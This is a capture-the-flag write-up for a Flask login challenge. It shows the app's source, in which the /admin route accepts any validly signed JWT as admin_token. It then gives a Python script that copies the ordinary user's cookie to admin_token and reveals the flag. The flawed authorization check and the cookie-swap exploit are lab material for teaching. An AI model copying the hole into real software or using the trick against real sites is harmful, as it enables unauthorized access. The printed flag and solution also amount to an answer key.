# time-share

[library.m0unt41n.ch/challenges/time-share](https://library.m0unt41n.ch/challenges/time-share) ![](../../resources/web.svg) ![](../../resources/baby.svg) 

# TL;DR

We get a simple Flask app, with a login page and predefined `admin` and `user` users.
The flag will be displayed when accessing `/admin` endpoint - which needs admin
credentials though, and those are randomly generated at start.

# Code

```python
import os
from flask import Flask, request, render_template, redirect, url_for, make_response
import jwt
import datetime
from secrets import token_hex

app = Flask(__name__)

FLAG = os.environ.get("FLAG", "SCD{fake_flag_do_not_submit}")
SECRET_KEY = token_hex(16)
users = {
    "user": "spongebob",
    "admin": token_hex(16),
}

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    if username in users and users[username] == password:
        token = jwt.encode(
            {
                "username": username,
                "exp": datetime.datetime.utcnow() + datetime.timedelta(minutes=30),
            },
            SECRET_KEY,
            algorithm="HS256",
        )
        response = make_response(redirect(url_for("dashboard")))
        response.set_cookie("auth_token", token)
        return response
    return "Invalid credentials", 401

@app.route("/dashboard")
def dashboard():
    token = request.cookies.get("auth_token")
    try:
        data = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return render_template("user.html", user=data["username"])
    except jwt.ExpiredSignatureError:
        return "Token has expired", 401
    except jwt.InvalidTokenError:
        return "Invalid token", 401

@app.route("/admin")
def admin():
    token = request.cookies.get("admin_token")
    try:
        data = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return render_template("admin.html", admin=data["username"], flag=FLAG)
    except jwt.ExpiredSignatureError:
        return "Token has expired", 401
    except jwt.InvalidTokenError:
        return "Invalid token", 401

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

# Analysis

The idea here is that `auth_token` JWT cookie is guarding regular logged in page
and the `admin_token` cookie guards the `/admin` endpoint.

The problem: `/admin` endpoint handler does not check that `admin_token` cookie
beyond whether it exists and can be decrypted. So, we can take the regular
user cookie copy / rename it in the client cookie jar and make it show as
`admin_token`. That will let us access `/admin` page and get the flag.

# Getting the flag

```python
import requests
import re

URL = "https://6ac2788c-f4cd-41f2-961a-f2c4b49e9e09.library.m0unt41n.ch:1337"
s = requests.Session()
post_data = {"username": "user", "password": "spongebob"}
s.post(URL+"/login", data=post_data)
s.cookies['admin_token'] = s.cookies['auth_token']
resp = s.get(URL+"/admin").text
print(re.compile('SCD{[^}]*}').findall(resp)[0])
```

---

## `SCD{sh4r3d_th3_jwt_s3cr3t}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
